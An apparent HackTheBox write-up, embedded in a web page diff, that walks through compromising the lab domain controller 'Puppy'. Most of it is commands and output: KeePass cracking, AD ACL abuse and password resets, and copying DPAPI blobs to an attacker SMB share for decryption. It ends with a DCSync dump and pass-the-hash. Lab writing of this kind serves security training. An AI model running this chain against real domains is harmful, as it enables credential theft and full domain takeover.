+<p>The environment is an <strong>Active Directory domain controller</strong> with LDAP, Kerberos, SMB and WinRM exposed.</p>
+</li>
+<li>
+<p><strong>Initial access</strong>: valid user credentials (dev share) exposed a KeePass DB and a backup containing plaintext service creds, highlighting poor secret storage and backup hygiene.</p>
+</li>
+<li>
+<p><strong>Credential extraction</strong>: KeePass password and backup secrets enabled lateral movement. DPAPI masterkey extraction from user profile allowed decryption of stored domain credentials.</p>
+</li>
+<li>
+<p><strong>Privilege escalation</strong>: excessive AD ACLs (WriteDACL/WriteOwner/GenericWrite) and permissive group membership were abused to change ACLs and reset accounts.</p>
+</li>
+<li>
+<p><strong>Domain compromise</strong>: high-rights account used for <strong>DCSync</strong> (impacket-secretsdump) to extract NTDS and obtain Administrator NTLM; pass-the-hash used to get Administrator shell.</p>
+</li>
+</ul></div><dialog class="reader-image-dialog" aria-label="Enlarged article image"><button type="button" class="reader-image-close" aria-label="Close image"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></dialog></div></div></div></main></div><!--/$--></div></div><script id="article-data" type="application/json">{"kind":"writeup","entry":{"id":"puppy","title":"Puppy","platform":"hackthebox","difficulty":"medium","os":"windows","tags":["Active Directory","SMB","KeePass","DPAPI","DCSync"],"date":"2025-09-16","summary":"Compromised an Active Directory domain controller by exploiting weak secrets management, abusing overly permissive ACLs, and leveraging DPAPI to recover high-privilege credentials, culminating in a full domain compromise via a DCSync attack.","contentPath":"puppy.md","previewImage":"/assets/previews/writeup-puppy.png","icon":"/assets/htb/puppy.png","kind":"writeup","folder":"writeups","route":"boxes/hackthebox/puppy"},"route":"boxes/hackthebox/puppy","content":"# Puppy - HackTheBox Writeup\n\n## Initial Enumeration\n\n---\n\n## 1. External Enumeration\n\n### TCP Scans\n\n#### Fast Scan Overview\n\n```bash\nnmap puppy.htb -Pn -F -T5\n```\n\n```bash\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n111/tcp  open  rpcbind\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n2049/tcp open  nfs\n```\n\nStandard Windows AD/DC ports detected: DNS, Kerberos, LDAP, SMB, NFS.\n    \nTarget likely an Active Directory domain controller.\n    \n\n---\n\n#### Detailed TCP Scan\n\n```bash\nsudo nmap 10.10.11.70 -sV -sC -T4 -p- -Pn --open -oN nmap_full_TCP.txt\n```\n\n```bash\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-13 21:27:42Z)\n111/tcp   open  rpcbind       2-4 (RPC #100000)\n\u003cSNIP\u003e\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n2049/tcp  open  nlockmgr      1-4 (RPC #100021)\n3260/tcp  open  iscsi?\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n\u003cSNIP\u003e\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: 7h00m00s\n| smb2-time:\n|   date: 2025-09-13T21:29:32\n|_  start_date: N/A\n```\n\nFull TCP scan confirms Windows domain controller with SMB signing required.\n    \nMany standard AD services exposed: LDAP, Kerberos, SMB, HTTP endpoints.\n    \nClock skew observed (7h).\n    \n\n---\n\n## 2. Services Analysis\n\n### DNS Enumeration\n\n```bash\ndig axfr puppy.htb @10.10.11.70\n```\n\n```bash\n; Transfer failed.\n```\n\nZone transfer not allowed.\n    \n\n```bash\ndig txt puppy.htb @10.10.11.70\n```\n\n```bash\n;; AUTHORITY SECTION:\npuppy.htb. 3600 IN SOA dc.puppy.htb. hostmaster.puppy.htb. 176 900 600 86400 3600\n```\n\nTXT query confirms authoritative SOA record and DC hostname.\n    \n\n---\n\n### SMB Enumeration\n\n#### Anonymous Access Check\n\n```bash\nsmbclient -L \\\\puppy.htb -N\n```\n\n```bash\nAnonymous login successful\n        Sharename       Type      Comment\n        ---------       ----      -------\nSMB1 disabled -- no workgroup available\n```\n\nAnonymous login allowed, but no SMB1 shares available.\n    \n\n#### Authenticated Share Enumeration\n\n```bash\nsmbmap -H puppy.htb -u 'levi.james' -p 'KingofAkron2025!'\n```\n\n```bash\n[+] IP: 10.10.11.70:445 Name: puppy.htb\n        Disk     Permissions\n        ----     -----------\n        ADMIN$   NO ACCESS\n        C$       NO ACCESS\n        DEV      NO ACCESS\n        IPC$     READ ONLY\n        NETLOGON READ ONLY\n        SYSVOL   READ ONLY\n```\n\nAuthenticated user levi.james can access IPC$, NETLOGON, SYSVOL shares read-only.\n    \nDEV share exists but not listable.\n    \n\n---\n### LDAP Enumeration\n\n#### Basic Domain Information\n\n```bash\nnmap --script=ldap* -p 389 10.10.11.70 -Pn -T4\n```\n\n```bash\n| ldap-rootdse:\n|   domainFunctionality: 7\n|   forestFunctionality: 7\n|   domainControllerFunctionality: 7\n|   rootDomainNamingContext: DC=PUPPY,DC=HTB\n|   defaultNamingContext: DC=PUPPY,DC=HTB\n|_  dnsHostName: DC.PUPPY.HTB\n```\n\nLDAP rootDSE confirms domain structure: DC=PUPPY,DC=HTB.\n    \nForest and domain functional levels at 7 (Windows Server 2016+).\n    \n\n---\n\n#### Full LDAP Search\n\n```bash\nldapsearch -x -H ldap://puppy.htb -D \"levi.james@PUPPY.HTB\" -w \"KingofAkron2025!\" -b \"DC=PUPPY,DC=HTB\"\n```\n\n_Output trimmed to key findings:_\n\n- Account Lockout Threshold: 0 (no lockout policy)\n    \n- Minimum Password Length: 7 characters\n    \n- Password History: 24 passwords\n    \n- Domain Structure: DC=PUPPY,DC=HTB\n    \n- levi.james has valid credentials.\n    \n\n---\n\n### RPC Client Enumeration\n\n```bash\nrpcclient -U 'PUPPY.HTB\\levi.james' puppy.htb\n```\n\n```bash\nrpcclient $\u003e querydominfo\nDomain:         PUPPY\nTotal Users:    44\nTotal Groups:   0\nServer Role:    ROLE_DOMAIN_PDC\n```\n\n```bash\nrpcclient $\u003e enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[levi.james] rid:[0x44f]\nuser:[ant.edwards] rid:[0x450]\nuser:[adam.silver] rid:[0x451]\nuser:[jamie.williams] rid:[0x452]\nuser:[steph.cooper] rid:[0x453]\nuser:[steph.cooper_adm] rid:[0x457]\n```\n\nDomain Users discovered: Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm\n    \n\n```bash\nrpcclient $\u003e enumdomgroups\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[DEVELOPERS] rid:[0x459]\ngroup:[SENIOR DEVS] rid:[0x455]\ngroup:[HR] rid:[0x454]\n```\n\nGroups discovered: Domain Admins, DEVELOPERS, SENIOR DEVS, HR\n    \n\n---\n\n## 3. Automated Enumeration\n\n### Enum4Linux Summary\n\n```bash\nenum4linux -u 'levi.james' -p 'KingofAkron2025!' puppy.htb\n```\n\n- Valid credentials for levi.james\n    \n- Domain SID: `S-1-5-21-1487982659-1829050783-2281216199`\n    \n- Critical vulnerability: No account lockout policy\n    \n- DEV share exists but not listable\n    \n- Administrative account identified: steph.cooper_adm\n    \n\n---\n\n### Time Sync \u0026 BloodHound Mapping\n\nAdd host to /etc/hosts\n```bash\ndc.puppy.htb\n```\n\nSync time with DC\n```bash\nntpdate puppy.htb\n```\n\nRun BloodHound mapping\n```bash\nbloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip\n```\n\nBloodHound confirms 1 domain, 1 computer, 10 users, 56 groups.\n\n![puppy_1](/assets/puppy/puppy_1.jpg)\n\n---\n### DEV Share Access \u0026 KeePass\n\nSince we have GenercWrite over develpoers group we can add ourself to DEV group:\n\n```bash\nbloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james  \n```\n\nlevi.james added to DEVELOPERS.\n\n```bash\nsmbclient //10.10.11.70/DEV -U 'levi.james'\n```\n\n```bash\nPassword for [WORKGROUP\\levi.james]:  \nsmb: \\\u003e ls  \n.  DR 0 2025-09-15 15:01  \n.. D 0 2025-03-08 10:52  \nKeePassXC-2.7.9-Win64.msi A 34394112 \u003cSNIP\u003e\nProjects D 0 \u003cSNIP\u003e\nrecovery.kdbx A 2677 \u003cSNIP\u003e\n\nsmb: \\\u003e get KeePassXC-2.7.9-Win64.msi  \nsmb: \\\u003e get recovery.kdbx  \n```\n\nDEV share contains KeePass installer and recovery.kdbx file.\n    \n\n```bash\nfile recovery.kdbx\n```\n\n```bash\nrecovery.kdbx: Keepass password database 2.x KDBX\n```\n\nKeePass database detected.\n\nIf we try to bruteforce the recovery.kdbx with john it fails:\n```\nkeepass2john recovery.kdbx  \n! recovery.kdbx : File version '40000' is currently not supported! \n```\n\nWe can use this tool to crack the password for the recovery db: [https://github.com/r3nt0n/keepass4brute.git](https://github.com/r3nt0n/keepass4brute.git \"https://github.com/r3nt0n/keepass4brute.git\")\n\n```bash\nkeepass4brute/keepass4brute.sh recovery.kdbx rockyou.txt\n```\n\n```bash\n[*] Password found: liverpool\n```\n\n- KeePass database password recovered: `liverpool`\n\n![puppy_2](/assets/puppy/puppy_2.jpg)\n\nHere the extracted credentials:\n`ADAM SILVER : HJKL2025!`  \n`ANTONY C. EDWARDS : Antman2025!`  \n`JAMIE WILLIAMSON : JamieLove2025!`  \n`SAMUEL BLAKE : ILY2025!`  \n`STEVE TUCKER : Steve2025!`\n\n---\n\n### SMB Login Validation\n\n```bash\ncrackmapexec smb 10.10.11.70 -u usernames.txt -p pass.txt\n```\n\n```bash\nSMB 10.10.11.70 445 DC [+] PUPPY.HTB\\ant.edwards:Antman2025!\n```\n\n- ant.edwards credentials validated, able to authenticate to SMB.\n\nRe-scan the environment from ant-edwards perspective:\n```bash\nbloodhound-python -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip\n```\n\n---\n\n## 4. Account Takeover \u0026 SMB/AD Exploitation\n\n### Outbound Object Control via BloodHound\n\n![puppy_3](/assets/puppy/puppy_3.jpg)\n\n- Now we have generic all over Adam.Silver.\n\n### AD Account Password Reset (ADAM.SILVER)\n\n```bash\nbloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Pwned123!\n```\n\n```bash\n[+] Password changed successfully!\n```\n\n- Password for AD account ADAM.SILVER successfully changed.\n\n#### Verify access:\n\n```\ncrackmapexec smb [10.10.11.70](https://10.10.11.70/ \"https://10.10.11.70/\") -u ADAM.SILVER -p 'Pwned123!' -d PUPPY.HTB \n```\n\n```\nSMB [10.10.11.70](https://10.10.11.70/ \"https://10.10.11.70/\")     445 DC [-] PUPPY.HTB\\ADAM.SILVER:Pwned123! STATUS_ACCOUNT_DISABLED  \n```\n\n- We still can't access to this account since \"STATUS_ACCOUNT_DISABLED\"\n- Requires LDAP modification.\n\n#### Verify account status\n\n```bash\nldapsearch -x -H ldap://10.10.11.70 -D \"ANT.EDWARDS@PUPPY.HTB\" -W -b \"DC=puppy,DC=htb\" \"(sAMAccountName=ADAM.SILVER)\"\n```\n\n```bash\n\u003cSNIP\u003e\nuserAccountControl: 66050\n```\n\n- AD account ADAM.SILVER confirmed as disabled (userAccountControl: 66050).\n    \n\n---\n\n### Enable ADAM.SILVER via LDIF\n\nCreate file: enable_adam.ldif \n```txt\ndn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB\nchangetype: modify\nreplace: userAccountControl\nuserAccountControl: 512\n```\n\n```bash\nldapmodify -x -H ldap://10.10.11.70 -D \"ANT.EDWARDS@PUPPY.HTB\" -w 'Antman2025!' -f enable_adam.ldif\n```\n\n```bash\nmodifying entry \"CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB\"\n```\n\n- ADAM.SILVER account successfully enabled (userAccountControl now 512).\n---\n\n### Initial Foothold via Evil-WinRM\n\n```bash\nevil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Pwned123!'\n```\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop\u003e ls\nMode LastWriteTime Length Name\n-a---- 9/15/2025 4:02 AM 34 user.txt\n\u003cSNIP\u003e\n```\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop\u003e cat user.txt\n3fcd9cef\u003cREDACTED\u003e\n```\n\n- Initial user shell obtained for ADAM.SILVER.\n    \n- user.txt captured on Desktop confirms foothold.\n    \n\n---\n## Privileges Esaclation\n\n### Local Windows Machine Pillaging\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents\u003e whoami /all\n```\n\n```text\nUSER INFORMATION\nUser Name SID\npuppy\\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105\n\nGROUP INFORMATION\nGroup Name ... \nPUPPY\\DEVELOPERS ... S-1-5-21-1487982659-1829050783-2281216199-1113\n... BUILTIN\\Remote Management Users, BUILTIN\\Users, NT AUTHORITY\\NETWORK, etc.\n\nPRIVILEGES INFORMATION\nSeMachineAccountPrivilege Add workstations to domain Enabled\nSeChangeNotifyPrivilege Bypass traverse checking Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\n- User is member of DEVELOPERS and standard builtin groups.\n    \n- SeMachineAccountPrivilege present and enabled (can create machine accounts).\n    \n- Useful local privileges enumerated for lateral/privilege escalation.\n    \n\n---\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents\u003e net localgroup administrators\n```\n\n```text\nAlias name administrators\nMembers\nAdministrator\nDomain Admins\nEnterprise Admins\nsteph.cooper_adm\nThe command completed successfully.\n```\n\n- steph.cooper_adm is a local administrator on this host.\n    \n\n---\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents\u003e Get-ADUser adam.silver -Properties msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity\n```\n\n```text\nDistinguishedName : CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB\nEnabled : True\nGivenName : Adam\nName : Adam D. Silver\nSamAccountName : adam.silver\nUserPrincipalName : adam.silver@PUPPY.HTB\n\u003cSNIP\u003e\n```\n\n- AD user object confirmed. No delegation properties shown in output snippet.\n    \n\n---\n\n### Backup Recon and Secret Harvesting\n\n```powershell\n*Evil-WinRM* PS C:\\Backups\u003e ls\n```\n\n```text\nMode LastWriteTime Length Name\n-a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip\n```\n\n- Backup archive found at C:\\Backups\\site-backup-2024-12-30.zip.\n    \n- On attacker machine after download \u0026 unzip:\n```bash\ngrep -RiE \"pass|user\" .\n./assets/sass/main.scss: input[type=\"password\"],\n./nms-auth-config.xml.bak: \u003cbind-password\u003eChefSteph2025!\u003c/bind-password\u003e\n```\n\n- grep located backup file containing nms-auth-config.xml.bak with an embedded bind-password.\n- read ./nms-auth-config.xml.bak \n```xml\n\u003cSNIP\u003e\n\u003cbase-dn\u003edc=PUPPY,dc=HTB\u003c/base-dn\u003e\n\u003cbind-dn\u003ecn=steph.cooper,dc=puppy,dc=htb\u003c/bind-dn\u003e\n\u003cbind-password\u003eChefSteph2025!\u003c/bind-password\u003e\n```\n\n- Credentials recovered: steph.cooper : ChefSteph2025!\n\n---\n## Login as steph.cooper\n\n```bash\nevil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'\nupload winPEASx64.exe\n```\n\n---\n\n### winPEAS Findings \n\n- Writable Named Pipes with Everyone write/create permissions (eventlog, ROUTER, RpcProxy*, vgauth-service).\n    \n- LSA Protection and CredentialGuard disabled.\n    \n- SeMachineAccountPrivilege enabled for current token.\n    \n- cachedlogonscount = 10 (cached credentials exist).\n    \n- AutoLogon credentials present.\n    \n- LocalAccountTokenFilterPolicy indicates only RID-500 local admin usable for lateral movement.\n    \n- These findings indicate multiple credential extraction and abuse vectors.\n    \n\n---\n\n## DPAPI / Masterkey Extraction and Decryption\n\nAfter local recon we discover:\n\n```powershell\nC:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9\n\nC:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407\n```\n\n- User DPAPI masterkey and credential blob located in user profile.\n\n#### Start attacker smbserver\n```bash\nimpacket-smbserver share ./share -smb2support\n```\n\n#### Copy files from target:\n```powershell\ncopy \"\u003cmasterkey path\u003e\" \\\\10.10.14.137\\share\\masterkey_blob\ncopy \"\u003ccredential path\u003e\" \\\\10.10.14.137\\share\\credential_blob\n```\n\n### Decrypt the key\n\n```bash\nimpacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107\n```\n\n```text\n[MASTERKEYFILE]\nVersion : 2 (2)\nGuid : 556a2412-1275-4ccf-b721-e6a0b4f90407\n...\nDecrypted key with User Key (MD4 protected)  \nDecrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\n```\n\n- Masterkey successfully decrypted using steph.cooper password.\n\n```bash\nimpacket-dpapi credential -file credential_blob -key 0xd9a57...9e9c84\n```\n\n```text\n[CREDENTIAL]\nLastWritten : 2025-03-08 15:54:29+00:00\nType : CRED_TYPE_DOMAIN_PASSWORD\nTarget : Domain:target=PUPPY.HTB\nUsername : steph.cooper_adm\nUnknown : FivethChipOnItsWay2025!\n```\n\n- DPAPI credential decrypted. Recovered domain privileged credential:  \n    **steph.cooper_adm : FivethChipOnItsWay2025!**\n    \n\n---\n## Domain Admin Takeover\n\n\n### BloodHound Enumeration\n\n```bash\nbloodhound-python -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip\n```\n\n![puppy_4](/assets/puppy/puppy_4.jpg)\n\n![puppy_5](/assets/puppy/puppy_5.jpg)\n\n- Analysis shows `steph.cooper_adm` has **WriteDacl**, **WriteOwner**, **GenericWrite** over `ADMINISTRATORS` group.\n    \n- `ADMINISTRATORS` has **AllExtendedRights** over `Administrator`.\n    \n- Effective control chain enables **DCSync** attack.\n    \n\n---\n### DCSync Execution\n\n```bash\nimpacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70\n```\n\n```text\nAdministrator:500:...:9c541c389e2904b9b112f599fd6b333d:::\n\u003cSNIP\u003e\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:...:bb0edc15e49ceb4120c7bd7e6e65d75b:::\nkrbtgt:502:...:a4f2989236a639ef3f766e5fe1aad94a:::\nPUPPY.HTB\\steph.cooper_adm:1111:...:ccb206409049bc53502039b80f3f1173:::\n\u003cSNIP\u003e\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0\n\u003cSNIP\u003e\n```\n\n- Full NTDS dump obtained.\n    \n- Administrator NTLM hash: **bb0edc15e49ceb4120c7bd7e6e65d75b**.\n\n---\n\n### Final Access as Domain Admin\n\n### Pass-the-hash\n\n```bash\nevil-winrm -i 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'\n```\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e ls\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\nMode LastWriteTime Length Name\n---- ------------- ------ ----\n-ar--- 9/16/2025 5:51 AM 34 root.txt\n```\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat root.txt\nb88e5b3\u003cREDACTED\u003e\n```\n\n- Root flag captured.\n    \n- Domain compromise achieved via DCSync → Administrator hash → full system takeover.\n    \n\n---\n## Conclusions\n\n- The environment is an **Active Directory domain controller** with LDAP, Kerberos, SMB and WinRM exposed.\n    \n- **Initial access**: valid user credentials (dev share) exposed a KeePass DB and a backup containing plaintext service creds, highlighting poor secret storage and backup hygiene.\n    \n- **Credential extraction**: KeePass password and backup secrets enabled lateral movement. DPAPI masterkey extraction from user profile allowed decryption of stored domain credentials.\n    \n- **Privilege escalation**: excessive AD ACLs (WriteDACL/WriteOwner/GenericWrite) and permissive group membership were abused to change ACLs and reset accounts.\n    \n- **Domain compromise**: high-rights account used for **DCSync** (impacket-secretsdump) to extract NTDS and obtain Administrator NTLM; pass-the-hash used to get Administrator shell."}</script>
+    
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "6090182987b5451bb264dcd59cd2b600"}'></script>
+  </body>
+</html>
